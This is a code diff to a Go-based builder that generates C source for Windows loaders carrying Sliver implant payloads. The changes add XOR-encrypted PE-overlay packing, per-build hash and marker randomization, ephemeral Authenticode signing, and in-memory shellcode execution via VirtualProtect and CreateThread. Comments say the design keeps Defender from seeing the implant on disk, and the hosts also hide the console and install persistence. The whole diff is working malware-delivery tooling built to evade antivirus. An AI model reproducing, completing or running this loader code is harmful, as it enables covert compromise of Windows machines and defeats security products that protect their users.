@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"context"
 	"encoding/base64"
+	"encoding/binary"
 	"fmt"
 	"os"
 	"os/exec"
@@ -77,6 +78,31 @@ func cXorLit(s string, k byte) string {
 	return cByteLit(b)
 }
 
+// cIncbinDecl emits a MinGW-compatible .incbin blob (works on GCC 13+;
+// C23 #embed / -std=gnu23 do not).
+func cIncbinDecl(sym, file string) string {
+	return `extern const unsigned char ` + sym + `[];
+extern const unsigned char ` + sym + `_end[];
+__asm__(
+#if defined(__i386__)
+".section .rdata,\"dr\"\n"
+".globl _` + sym + `\n"
+"_` + sym + `:\n"
+".incbin \"` + file + `\"\n"
+".globl _` + sym + `_end\n"
+"_` + sym + `_end:\n"
+#else
+".section .rdata,\"dr\"\n"
+".globl ` + sym + `\n"
+"` + sym + `:\n"
+".incbin \"` + file + `\"\n"
+".globl ` + sym + `_end\n"
+"` + sym + `_end:\n"
+#endif
+);
+`
+}
+
 func buildWindowsC(opts Options) (*Result, error) {
 	cc, err := lookMingw(opts.GOARCH)
 	if err != nil {
@@ -90,32 +116,36 @@ func buildWindowsC(opts Options) (*Result, error) {
 	}
 	defer os.RemoveAll(dir)
 
-	if !opts.DiskDLL {
-		payload := xorCopy(opts.Payload, combinedXORKey(opts))
-		if err := os.WriteFile(filepath.Join(dir, "cfg.dat"), payload, 0o600); err != nil {
-			return nil, err
-		}
-	}
 	noise := opts.Noise
 	if len(noise) == 0 {
 		noise = []byte{0}
 	}
-	if err := os.WriteFile(filepath.Join(dir, "n.bin"), noise, 0o600); err != nil {
-		return nil, err
+	var src string
+	// Windows MinGW always uses PE-overlay packing (not .incbin into .rdata):
+	// large Sliver blobs in .rdata caused DEP/0xc0000005. DiskDLL drops a
+	// sibling DLL (AV often quarantines); default mem mode runs shellcode
+	// from the overlay in-process with no disk write.
+	if opts.DiskDLL {
+		src = windowsDiskDLLSource(opts)
+	} else {
+		src = windowsMemOverlaySource(opts)
 	}
-	if err := os.WriteFile(filepath.Join(dir, "main.c"), []byte(windowsCSource(opts)), 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(dir, "main.c"), []byte(src), 0o644); err != nil {
 		return nil, err
 	}
 
 	outPath := filepath.Join(dir, "loader.exe")
+	// gnu17: host MinGW is often GCC 13 (no -std=gnu23 / #embed).
+	// Payload bytes are pulled in via .incbin, not C23 #embed.
 	args := []string{
-		"-std=gnu23", "-Os", "-s", "-fno-ident", "-Wl,--gc-sections",
+		"-std=gnu17", "-Os", "-s", "-fno-ident",
 		"-o", outPath, "main.c",
-		"-lkernel32", "-luser32", "-ladvapi32",
+		"-lkernel32", "-luser32", "-ladvapi32", "-lshell32", "-lole32", "-luuid",
 	}
-	if opts.HideConsole {
-		args = append([]string{"-mwindows"}, args...)
-	}
+	// Retain noise/stub bytes so two builds do not share a stub hash.
+	// No --gc-sections: overlay hosts keep per-build noise arrays.
+	// Console subsystem (no -mwindows): GUI subsystem correlated with
+	// 0xc0000005 when calling heavy Go/Donut entrypoints.
 
 	ctx, cancel := context.WithTimeout(context.Background(), compileTimeout)
 	defer cancel()
@@ -141,7 +171,48 @@ func buildWindowsC(opts Options) (*Result, error) {
 	if len(bin) == 0 {
 		return nil, fmt.Errorf("compiler produced an empty file")
 	}
-	engine := "mingw-c"
+	// Per-build PE identity + overlay: pad || XOR(payload) || u64le(len) || magic8
+	bin = scramblePEIdentity(bin)
+	padN := 32 + int(binary.LittleEndian.Uint16(randBytes(2)))%2048
+	bin = append(bin, randBytes(padN)...)
+	xorPayload := xorCopy(opts.Payload, combinedXORKey(opts))
+	magic := overlayMagic(opts)
+	var trailer []byte
+	trailer = append(trailer, xorPayload...)
+	sz := make([]byte, 8)
+	binary.LittleEndian.PutUint64(sz, uint64(len(xorPayload)))
+	trailer = append(trailer, sz...)
+	trailer = append(trailer, magic...)
+	bin = append(bin, trailer...)
+	// osslsigncode 8-byte-aligns the Authenticode cert table and inserts
+	// 0..7 pad bytes after the trailer. Keep the pre-sign length aligned
+	// so cert_off lands immediately after magic (extract also scans back).
+	for len(bin)%8 != 0 {
+		bin = append(bin, 0)
+	}
+
+	wantSign := opts.GOOS == "windows"
+	if opts.SignAuthenticode != nil {
+		wantSign = *opts.SignAuthenticode
+	}
+	var signerCN string
+	if wantSign {
+		signed, cn, err := signEphemeralAuthenticode(bin, opts)
+		if err != nil {
+			if opts.SignAuthenticode != nil && *opts.SignAuthenticode {
+				return nil, fmt.Errorf("authenticode: %w", err)
+			}
+			// Default path: soft-skip if the toolchain is incomplete.
+		} else {
+			bin = signed
+			signerCN = cn
+		}
+	}
+
+	engine := "mingw-c-mem"
+	if opts.DiskDLL {
+		engine = "mingw-c-dll"
+	}
 	res := &Result{
 		Filename:    Filename(opts.Name, opts.GOOS),
 		DataB64:     base64.StdEncoding.EncodeToString(bin),
@@ -152,13 +223,534 @@ func buildWindowsC(opts Options) (*Result, error) {
 		Persistence: opts.Persistence,
 		PayloadSize: len(opts.Payload),
 		Engine:      engine,
+		Signed:      signerCN != "",
+		SignerCN:    signerCN,
 	}
 	if opts.DiskDLL {
-		res.Engine = "mingw-c-dll"
+		// DLL lives in the PE overlay; single-file download (dropped on run).
 		res.DllFilename = opts.DLLName
-		res.DllDataB64 = base64.StdEncoding.EncodeToString(opts.Payload)
 	}
 	return res, nil
+}
+
+// overlayMagic is a per-build 8-byte trailer marker (not a fixed IOC string).
+func overlayMagic(opts Options) []byte {
+	m := make([]byte, 8)
+	if len(opts.Nonce) >= 8 {
+		copy(m, opts.Nonce[:8])
+		return m
+	}
+	mix := append(append([]byte{}, opts.Nonce...), []byte(opts.BuildID)...)
+	mix = append(mix, []byte(opts.XORKey)...)
+	if len(mix) == 0 {
+		return randBytes(8)
+	}
+	for i := 0; i < 8; i++ {
+		m[i] = mix[i%len(mix)] ^ byte(0xA5+i*13)
+	}
+	return m
+}
+
+// scramblePEIdentity rewrites COFF TimeDateStamp so two otherwise-similar
+// MinGW stubs do not share a PE header hash prefix.
+func scramblePEIdentity(bin []byte) []byte {
+	if len(bin) < 0x40 {
+		return bin
+	}
+	e := binary.LittleEndian.Uint32(bin[0x3c:])
+	if int(e)+12 >= len(bin) || bin[e] != 'P' || bin[e+1] != 'E' {
+		return bin
+	}
+	out := append([]byte(nil), bin...)
+	binary.LittleEndian.PutUint32(out[e+8:], binary.LittleEndian.Uint32(randBytes(4)))
+	return out
+}
+
+// windowsDiskDLLSource emits a small self-extract host. The XOR'd DLL is
+// appended after the PE as an overlay (see buildWindowsC); on run the host
+// reads the trailer, drops the DLL next to itself (TEMP fallback), then
+// LoadLibrary + CreateThread(8MiB) + Wait — same shape as mini_loader.
+// Per-build: XOR nonce, overlay magic, noise blob, PE timestamp, overlay pad.
+func windowsDiskDLLSource(opts Options) string {
+	dllName := opts.DLLName
+	if dllName == "" {
+		dllName = "payload.dll"
+	}
+	export := opts.Export
+	if export == "" {
+		export = DefaultRDIExport
+	}
+	hide := bool01(opts.HideConsole)
+	key := combinedXORKey(opts)
+	magic := overlayMagic(opts)
+	wdll := strconv.QuoteToASCII(dllName)
+	wdll = wdll[1 : len(wdll)-1]
+	exp := strconv.Quote(export)
+	xorDecl := "static const unsigned char xor_key[] = " + cByteLit([]byte(key)) + ";\n"
+	magicDecl := "static const unsigned char overlay_magic[8] = " + cByteLit(magic) + ";\n"
+	noise := opts.Noise
+	if len(noise) == 0 {
+		noise = []byte{0}
+	}
+	if len(noise) > 1536 {
+		noise = noise[:1536]
+	}
+	noiseDecl := "static volatile unsigned char noise[] = " + cByteLit(noise) + ";\n" +
+		"static volatile unsigned char noise_keep;\n"
+	return `#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <wchar.h>
+
+#define HIDE_CONSOLE ` + hide + `
+
+` + xorDecl + magicDecl + noiseDecl + windowsPersistC(opts) + `
+static DWORD WINAPI disk_start(LPVOID p) {
+	((void (*)(void))p)();
+	return 0;
+}
+
+static int write_buf(const wchar_t *path, const unsigned char *buf, DWORD n) {
+	HANDLE f;
+	DWORD written = 0;
+	BOOL ok;
+	if (!path || !path[0] || !buf || n == 0)
+		return 0;
+	f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (f == INVALID_HANDLE_VALUE)
+		return 0;
+	ok = WriteFile(f, buf, n, &written, NULL);
+	CloseHandle(f);
+	return ok && written == n;
+}
+
+static void sibling_dll(const wchar_t *self, wchar_t *out, int cap) {
+	wchar_t *slash;
+	if (!self || !out || cap < 8)
+		return;
+	lstrcpynW(out, self, cap);
+	slash = wcsrchr(out, L'\\');
+	if (!slash)
+		slash = wcsrchr(out, L'/');
+	if (!slash) {
+		out[0] = 0;
+		return;
+	}
+	lstrcpyW(slash + 1, L"` + wdll + `");
+}
+
+static void temp_dll(wchar_t *out, int cap) {
+	wchar_t dir[MAX_PATH];
+	DWORD n;
+	if (!out || cap < 8)
+		return;
+	n = GetTempPathW(MAX_PATH, dir);
+	if (!n || n >= MAX_PATH) {
+		out[0] = 0;
+		return;
+	}
+	lstrcpynW(out, dir, cap);
+	if (lstrlenW(out) + 64 >= cap) {
+		out[0] = 0;
+		return;
+	}
+	lstrcatW(out, L"` + wdll + `");
+}
+
+/* Overlay is after PE sections and before Authenticode cert (if signed):
+ * [PE][pad|xor dll|u64le size|magic8][optional cert]. */
+static int seek_abs(HANDLE f, ULONGLONG off) {
+	LONG hi = (LONG)(off >> 32);
+	DWORD r = SetFilePointer(f, (LONG)off, &hi, FILE_BEGIN);
+	return r != INVALID_SET_FILE_POINTER || GetLastError() == NO_ERROR;
+}
+
+static ULONGLONG overlay_region_end(HANDLE f, ULONGLONG file_n) {
+	unsigned char hdr[256];
+	DWORD rd = 0, e_lfanew, i, pe_end = 0, cert_off = 0;
+	WORD nsec, optsz, omagic;
+	if (!seek_abs(f, 0) || !ReadFile(f, hdr, 64, &rd, NULL) || rd < 64)
+		return file_n;
+	if (hdr[0] != 'M' || hdr[1] != 'Z')
+		return file_n;
+	e_lfanew = (DWORD)hdr[0x3c] | ((DWORD)hdr[0x3d] << 8) | ((DWORD)hdr[0x3e] << 16) | ((DWORD)hdr[0x3f] << 24);
+	if ((ULONGLONG)e_lfanew + 24 >= file_n)
+		return file_n;
+	if (!seek_abs(f, e_lfanew) || !ReadFile(f, hdr, sizeof(hdr), &rd, NULL) || rd < 26)
+		return file_n;
+	if (hdr[0] != 'P' || hdr[1] != 'E')
+		return file_n;
+	nsec = (WORD)hdr[6] | ((WORD)hdr[7] << 8);
+	optsz = (WORD)hdr[20] | ((WORD)hdr[21] << 8);
+	omagic = (WORD)hdr[24] | ((WORD)hdr[25] << 8);
+	{
+		DWORD dd = 0;
+		if (omagic == 0x20b)
+			dd = 24 + 112;
+		else if (omagic == 0x10b)
+			dd = 24 + 96;
+		if (dd && dd + 4 * 8 + 8 <= rd) {
+			DWORD o = dd + 4 * 8;
+			cert_off = (DWORD)hdr[o] | ((DWORD)hdr[o + 1] << 8) | ((DWORD)hdr[o + 2] << 16) | ((DWORD)hdr[o + 3] << 24);
+		}
+	}
+	for (i = 0; i < nsec && i < 96; i++) {
+		unsigned char sec[40];
+		DWORD rsz, rptr, off = e_lfanew + 24 + optsz + i * 40;
+		if (!seek_abs(f, off) || !ReadFile(f, sec, 40, &rd, NULL) || rd < 40)
+			break;
+		rsz = (DWORD)sec[16] | ((DWORD)sec[17] << 8) | ((DWORD)sec[18] << 16) | ((DWORD)sec[19] << 24);
+		rptr = (DWORD)sec[20] | ((DWORD)sec[21] << 8) | ((DWORD)sec[22] << 16) | ((DWORD)sec[23] << 24);
+		if (rptr && rsz && rptr + rsz > pe_end)
+			pe_end = rptr + rsz;
+	}
+	(void)pe_end;
+	if (cert_off > 0 && (ULONGLONG)cert_off <= file_n)
+		return cert_off;
+	return file_n;
+}
+
+static unsigned char *extract_overlay(const wchar_t *self, DWORD *out_n) {
+	HANDLE f;
+	LARGE_INTEGER sz;
+	unsigned char foot[16];
+	unsigned char *enc, *plain;
+	DWORD n, rd, i, ks;
+	ULONGLONG payload_n, tail, file_n;
+	if (out_n) *out_n = 0;
+	f = CreateFileW(self, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (f == INVALID_HANDLE_VALUE)
+		return NULL;
+	if (!GetFileSizeEx(f, &sz) || sz.QuadPart < 16) {
+		CloseHandle(f);
+		return NULL;
+	}
+	file_n = (ULONGLONG)sz.QuadPart;
+	tail = overlay_region_end(f, file_n);
+	if (tail < 16) {
+		CloseHandle(f);
+		return NULL;
+	}
+	/* Authenticode may insert 0..7 (rarely more) alignment bytes between
+	 * magic8 and the cert table. Probe backwards for a matching trailer. */
+	{
+		DWORD pad;
+		int matched = 0;
+		payload_n = 0;
+		for (pad = 0; pad < 16; pad++) {
+			if (tail < (ULONGLONG)16 + pad)
+				break;
+			if (!seek_abs(f, tail - 16 - pad) || !ReadFile(f, foot, 16, &rd, NULL) || rd != 16)
+				continue;
+			for (i = 0; i < 8; i++) {
+				if (foot[8 + i] != overlay_magic[i])
+					break;
+			}
+			if (i != 8)
+				continue;
+			payload_n = (ULONGLONG)foot[0] | ((ULONGLONG)foot[1] << 8) | ((ULONGLONG)foot[2] << 16) | ((ULONGLONG)foot[3] << 24)
+				| ((ULONGLONG)foot[4] << 32) | ((ULONGLONG)foot[5] << 40) | ((ULONGLONG)foot[6] << 48) | ((ULONGLONG)foot[7] << 56);
+			if (payload_n == 0 || payload_n > 0x10000000ULL)
+				continue;
+			if (tail < payload_n + 16 + pad)
+				continue;
+			if (!seek_abs(f, tail - 16 - pad - payload_n))
+				continue;
+			matched = 1;
+			break;
+		}
+		if (!matched) {
+			CloseHandle(f);
+			return NULL;
+		}
+	}
+	n = (DWORD)payload_n;
+	enc = (unsigned char *)VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!enc) {
+		CloseHandle(f);
+		return NULL;
+	}
+	if (!ReadFile(f, enc, n, &rd, NULL) || rd != n) {
+		VirtualFree(enc, 0, MEM_RELEASE);
+		CloseHandle(f);
+		return NULL;
+	}
+	CloseHandle(f);
+	plain = enc;
+	ks = (DWORD)sizeof(xor_key);
+	if (ks == 0) {
+		VirtualFree(enc, 0, MEM_RELEASE);
+		return NULL;
+	}
+	for (i = 0; i < n; i++)
+		plain[i] = (unsigned char)(enc[i] ^ xor_key[i % ks]);
+	if (out_n) *out_n = n;
+	return plain;
+}
+
+int main(void) {
+	wchar_t self[MAX_PATH], dll[MAX_PATH];
+	unsigned char *plain;
+	DWORD n = 0;
+	HMODULE h;
+	void (*entry)(void);
+	HANDLE th;
+
+	noise_keep = noise[0];
+	if (sizeof(noise) > 1)
+		noise_keep ^= noise[(xor_key[0] + 1) % (sizeof(noise) - 1)];
+
+	if (!GetModuleFileNameW(NULL, self, MAX_PATH))
+		return 1;
+
+#if HIDE_CONSOLE
+	{
+		HWND w = GetConsoleWindow();
+		if (w)
+			ShowWindow(w, SW_HIDE);
+		FreeConsole();
+	}
+#endif
+
+	persist();
+
+	plain = extract_overlay(self, &n);
+	if (!plain || n == 0)
+		return 2;
+
+	sibling_dll(self, dll, MAX_PATH);
+	if (!dll[0] || !write_buf(dll, plain, n)) {
+		temp_dll(dll, MAX_PATH);
+		if (!dll[0] || !write_buf(dll, plain, n)) {
+			VirtualFree(plain, 0, MEM_RELEASE);
+			return 3;
+		}
+	}
+	VirtualFree(plain, 0, MEM_RELEASE);
+
+	h = LoadLibraryW(dll);
+	if (!h)
+		return 4;
+	entry = (void (*)(void))GetProcAddress(h, ` + exp + `);
+	if (!entry)
+		return 5;
+	th = CreateThread(NULL, 8u << 20, disk_start, (LPVOID)entry, 0, NULL);
+	if (!th) {
+		entry();
+		for (;;)
+			Sleep(0xFFFFFFFFu);
+		return 6;
+	}
+	WaitForSingleObject(th, INFINITE);
+	CloseHandle(th);
+	return 0;
+}
+`
+}
+
+// windowsMemOverlaySource is the AV-facing host: same PE-overlay packing as
+// DiskDLL, but the payload is treated as shellcode and run in-process
+// (VirtualProtect + CreateThread). Nothing is written next to the EXE, so
+// Defender never sees a plaintext sibling implant DLL on disk.
+func windowsMemOverlaySource(opts Options) string {
+	hide := bool01(opts.HideConsole)
+	key := combinedXORKey(opts)
+	magic := overlayMagic(opts)
+	xorDecl := "static const unsigned char xor_key[] = " + cByteLit([]byte(key)) + ";\n"
+	magicDecl := "static const unsigned char overlay_magic[8] = " + cByteLit(magic) + ";\n"
+	noise := opts.Noise
+	if len(noise) == 0 {
+		noise = []byte{0}
+	}
+	if len(noise) > 1536 {
+		noise = noise[:1536]
+	}
+	noiseDecl := "static volatile unsigned char noise[] = " + cByteLit(noise) + ";\n" +
+		"static volatile unsigned char noise_keep;\n"
+	return `#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <wchar.h>
+
+#define HIDE_CONSOLE ` + hide + `
+
+` + xorDecl + magicDecl + noiseDecl + windowsPersistC(opts) + `
+static DWORD WINAPI mem_start(LPVOID p) {
+	((void (*)(void))p)();
+	return 0;
+}
+
+static int seek_abs(HANDLE f, ULONGLONG off) {
+	LONG hi = (LONG)(off >> 32);
+	DWORD r = SetFilePointer(f, (LONG)off, &hi, FILE_BEGIN);
+	return r != INVALID_SET_FILE_POINTER || GetLastError() == NO_ERROR;
+}
+
+static ULONGLONG overlay_region_end(HANDLE f, ULONGLONG file_n) {
+	unsigned char hdr[256];
+	DWORD rd = 0, e_lfanew, i, pe_end = 0, cert_off = 0;
+	WORD nsec, optsz, omagic;
+	if (!seek_abs(f, 0) || !ReadFile(f, hdr, 64, &rd, NULL) || rd < 64)
+		return file_n;
+	if (hdr[0] != 'M' || hdr[1] != 'Z')
+		return file_n;
+	e_lfanew = (DWORD)hdr[0x3c] | ((DWORD)hdr[0x3d] << 8) | ((DWORD)hdr[0x3e] << 16) | ((DWORD)hdr[0x3f] << 24);
+	if ((ULONGLONG)e_lfanew + 24 >= file_n)
+		return file_n;
+	if (!seek_abs(f, e_lfanew) || !ReadFile(f, hdr, sizeof(hdr), &rd, NULL) || rd < 26)
+		return file_n;
+	if (hdr[0] != 'P' || hdr[1] != 'E')
+		return file_n;
+	nsec = (WORD)hdr[6] | ((WORD)hdr[7] << 8);
+	optsz = (WORD)hdr[20] | ((WORD)hdr[21] << 8);
+	omagic = (WORD)hdr[24] | ((WORD)hdr[25] << 8);
+	{
+		DWORD dd = 0;
+		if (omagic == 0x20b)
+			dd = 24 + 112;
+		else if (omagic == 0x10b)
+			dd = 24 + 96;
+		if (dd && dd + 4 * 8 + 8 <= rd) {
+			DWORD o = dd + 4 * 8;
+			cert_off = (DWORD)hdr[o] | ((DWORD)hdr[o + 1] << 8) | ((DWORD)hdr[o + 2] << 16) | ((DWORD)hdr[o + 3] << 24);
+		}
+	}
+	for (i = 0; i < nsec && i < 96; i++) {
+		unsigned char sec[40];
+		DWORD rsz, rptr, off = e_lfanew + 24 + optsz + i * 40;
+		if (!seek_abs(f, off) || !ReadFile(f, sec, 40, &rd, NULL) || rd < 40)
+			break;
+		rsz = (DWORD)sec[16] | ((DWORD)sec[17] << 8) | ((DWORD)sec[18] << 16) | ((DWORD)sec[19] << 24);
+		rptr = (DWORD)sec[20] | ((DWORD)sec[21] << 8) | ((DWORD)sec[22] << 16) | ((DWORD)sec[23] << 24);
+		if (rptr && rsz && rptr + rsz > pe_end)
+			pe_end = rptr + rsz;
+	}
+	(void)pe_end;
+	if (cert_off > 0 && (ULONGLONG)cert_off <= file_n)
+		return cert_off;
+	return file_n;
+}
+
+static unsigned char *extract_overlay(const wchar_t *self, DWORD *out_n) {
+	HANDLE f;
+	LARGE_INTEGER sz;
+	unsigned char foot[16];
+	unsigned char *enc, *plain;
+	DWORD n, rd, i, ks;
+	ULONGLONG payload_n, tail, file_n;
+	if (out_n) *out_n = 0;
+	f = CreateFileW(self, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (f == INVALID_HANDLE_VALUE)
+		return NULL;
+	if (!GetFileSizeEx(f, &sz) || sz.QuadPart < 16) {
+		CloseHandle(f);
+		return NULL;
+	}
+	file_n = (ULONGLONG)sz.QuadPart;
+	tail = overlay_region_end(f, file_n);
+	if (tail < 16) {
+		CloseHandle(f);
+		return NULL;
+	}
+	{
+		DWORD pad;
+		int matched = 0;
+		payload_n = 0;
+		for (pad = 0; pad < 16; pad++) {
+			if (tail < (ULONGLONG)16 + pad)
+				break;
+			if (!seek_abs(f, tail - 16 - pad) || !ReadFile(f, foot, 16, &rd, NULL) || rd != 16)
+				continue;
+			for (i = 0; i < 8; i++) {
+				if (foot[8 + i] != overlay_magic[i])
+					break;
+			}
+			if (i != 8)
+				continue;
+			payload_n = (ULONGLONG)foot[0] | ((ULONGLONG)foot[1] << 8) | ((ULONGLONG)foot[2] << 16) | ((ULONGLONG)foot[3] << 24)
+				| ((ULONGLONG)foot[4] << 32) | ((ULONGLONG)foot[5] << 40) | ((ULONGLONG)foot[6] << 48) | ((ULONGLONG)foot[7] << 56);
+			if (payload_n == 0 || payload_n > 0x10000000ULL)
+				continue;
+			if (tail < payload_n + 16 + pad)
+				continue;
+			if (!seek_abs(f, tail - 16 - pad - payload_n))
+				continue;
+			matched = 1;
+			break;
+		}
+		if (!matched) {
+			CloseHandle(f);
+			return NULL;
+		}
+	}
+	n = (DWORD)payload_n;
+	enc = (unsigned char *)VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!enc) {
+		CloseHandle(f);
+		return NULL;
+	}
+	if (!ReadFile(f, enc, n, &rd, NULL) || rd != n) {
+		VirtualFree(enc, 0, MEM_RELEASE);
+		CloseHandle(f);
+		return NULL;
+	}
+	CloseHandle(f);
+	plain = enc;
+	ks = (DWORD)sizeof(xor_key);
+	if (ks == 0) {
+		VirtualFree(enc, 0, MEM_RELEASE);
+		return NULL;
+	}
+	for (i = 0; i < n; i++)
+		plain[i] = (unsigned char)(enc[i] ^ xor_key[i % ks]);
+	if (out_n) *out_n = n;
+	return plain;
+}
+
+int main(void) {
+	wchar_t self[MAX_PATH];
+	unsigned char *plain;
+	DWORD n = 0, old = 0;
+	HANDLE th;
+
+	noise_keep = noise[0];
+	if (sizeof(noise) > 1)
+		noise_keep ^= noise[(xor_key[0] + 1) % (sizeof(noise) - 1)];
+
+	if (!GetModuleFileNameW(NULL, self, MAX_PATH))
+		return 1;
+
+#if HIDE_CONSOLE
+	{
+		HWND w = GetConsoleWindow();
+		if (w)
+			ShowWindow(w, SW_HIDE);
+		FreeConsole();
+	}
+#endif
+
+	persist();
+
+	plain = extract_overlay(self, &n);
+	if (!plain || n == 0)
+		return 2;
+	if (!VirtualProtect(plain, n, PAGE_EXECUTE_READWRITE, &old)) {
+		VirtualFree(plain, 0, MEM_RELEASE);
+		return 3;
+	}
+	FlushInstructionCache(GetCurrentProcess(), plain, n);
+	th = CreateThread(NULL, 8u << 20, mem_start, (LPVOID)plain, STACK_SIZE_PARAM_IS_A_RESERVATION, NULL);
+	if (!th)
+		th = CreateThread(NULL, 8u << 20, mem_start, (LPVOID)plain, 0, NULL);
+	if (!th) {
+		((void (*)(void))plain)();
+		for (;;)
+			Sleep(0xFFFFFFFFu);
+		return 4;
+	}
+	WaitForSingleObject(th, INFINITE);
+	CloseHandle(th);
+	return 0;
+}
+`
 }
 
 func windowsCSource(opts Options) string {
@@ -177,10 +769,7 @@ func windowsCSource(opts Options) string {
 		export = DefaultRDIExport
 	}
 	xorKeyDecl := "static const unsigned char xor_key[] = " + cByteLit([]byte(key)) + ";\n"
-	blobDecl := `static const unsigned char blob[] = {
-#embed "cfg.dat"
-};
-`
+	blobDecl := cIncbinDecl("blob", "cfg.dat")
 	dllDecls := ""
 	if opts.DiskDLL {
 		xorKeyDecl = ""
@@ -215,10 +804,7 @@ static const unsigned char e_all[] = ` + cXorLit("all", k) + `;
 static const wchar_t persist_name[] = L` + strconv.Quote(pn) + `;
 static const char build_id[] = ` + strconv.Quote(opts.BuildID) + `;
 
-` + blobDecl + `static const unsigned char noise[] = {
-#embed "n.bin"
-};
-static volatile unsigned char noise_keep;
+` + blobDecl + cIncbinDecl("noise", "n.bin") + `static volatile unsigned char noise_keep;
 
 static void ds(const unsigned char *enc, int n, char *out) {
 	int i;
@@ -436,7 +1022,7 @@ static void jump(void *code, void *stack) {
 }
 
 static void run(void) {
-	SIZE_T n = sizeof(blob);
+	SIZE_T n = (SIZE_T)(blob_end - blob);
 	SIZE_T page = 0x1000;
 	SIZE_T reg = (n + page - 1) & ~(page - 1);
 	LPVOID addr, st, stk;
@@ -480,11 +1066,21 @@ static void run(void) {
 	for (;;) Sleep(0xFFFFFFFFu);
 }
 #else
+/* Working lab host shape (validated): LoadLibrary sibling DLL, resolve
+ * export, CreateThread with a large stack, wait. Matches rundll32 /
+ * mini_loader — avoids 0xc0000005 seen with -mwindows + direct call. */
+static DWORD WINAPI disk_start(LPVOID p) {
+	((void (*)(void))p)();
+	return 0;
+}
+
 static void run(void) {
 	wchar_t self[MAX_PATH], dll[MAX_PATH];
 	char exp[64];
 	HMODULE h;
 	void (*entry)(void);
+	HANDLE th;
+	DWORD wait;
 	if (!GetModuleFileNameW(NULL, self, MAX_PATH)) {
 		note("ll");
 		return;
@@ -501,7 +1097,22 @@ static void run(void) {
 		note("gp");
 		return;
 	}
-	entry();
+	/* 8 MiB stack — Go c-shared runtime is heavy on first call. */
+	th = CreateThread(NULL, 8u << 20, disk_start, (LPVOID)entry, STACK_SIZE_PARAM_IS_A_RESERVATION, NULL);
+	if (!th) {
+		th = CreateThread(NULL, 8u << 20, disk_start, (LPVOID)entry, 0, NULL);
+	}
+	if (!th) {
+		note("ct");
+		entry();
+		if (lab_fast()) return;
+		note("ret");
+		for (;;) Sleep(0xFFFFFFFFu);
+		return;
+	}
+	wait = lab_fast() ? 8000u : 0xFFFFFFFFu;
+	WaitForSingleObject(th, wait);
+	CloseHandle(th);
 	if (lab_fast()) return;
 	note("ret");
 	for (;;) Sleep(0xFFFFFFFFu);
@@ -511,6 +1122,18 @@ static void run(void) {
 static int sliv_main(void) {
 	(void)build_id;
 	noise_keep = noise[0];
+#if DISK_DLL
+	/* DiskDLL host: stay close to the known-good mini loader. Skip
+	 * emulator delay / sandbox exits that are unnecessary for MEM_IMAGE. */
+	if (HIDE_CONSOLE) {
+		HWND w = GetConsoleWindow();
+		if (w) ShowWindow(w, SW_HIDE);
+		FreeConsole();
+	}
+	persist();
+	run();
+	return 0;
+#else
 	hide_window();
 	if (sandbox()) {
 		note("box");
@@ -524,6 +1147,7 @@ static int sliv_main(void) {
 	persist();
 	run();
 	return 0;
+#endif
 }
 
 int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
@@ -544,7 +1168,7 @@ func randomizeCIdents(src string, seed []byte) string {
 		"persist_startup", "sibling_dll_path", "copy_sibling", "persist_task",
 		"persist_run", "hide_window", "enough_ram", "pause_emu", "method_all",
 		"method_is", "last_slash", "lab_fast", "sliv_main", "sandbox", "persist",
-		"jump", "note", "run", "ds",
+		"jump", "note", "run", "ds", "disk_start",
 	}
 	b := []byte(src)
 	for _, n := range names {
